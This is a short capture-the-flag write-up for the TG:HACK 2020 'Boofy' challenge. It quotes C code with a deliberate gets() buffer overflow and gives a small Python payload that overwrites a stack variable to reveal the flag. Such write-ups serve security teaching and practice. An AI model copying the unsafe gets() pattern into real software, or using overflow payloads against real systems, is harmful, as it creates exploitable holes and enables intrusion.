
## Boofy
### Description

> Author: [**Ingeborg Ytrehus - ingeborg_y#6548**](https://tghack.no/authors#16)
>
> This program looks like it's password protected, but we can't seem to find the correct password.
>
> ```
> nc boofy.tghack.no 6003
> ```
>
> or use a mirror closer to you:
>
> - `nc us.boofy.tghack.no 6003` (US)
> - `nc asia.boofy.tghack.no 6003` (Japan)
>
> files:
>
> - [download binary](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy)
> - [download source](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy.c)

### Analysis

It's a really easy task. The codes `gets(password)` will overflow the buffer and we can get flag by overwrite `correct` to `\x01`.

```c
void try_password(){
	char password[20] = { 0 };
	int correct = 0;	
	printf("Please enter the password?\n");
	gets(password);
	if (correct == 1) {
		get_flag();
	} else {
		printf("Sorry, but that's not the right password...\n");
	}
}
```

### Solution

```python
offset = 21
payload = '\x01'*offset
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/boofy) 


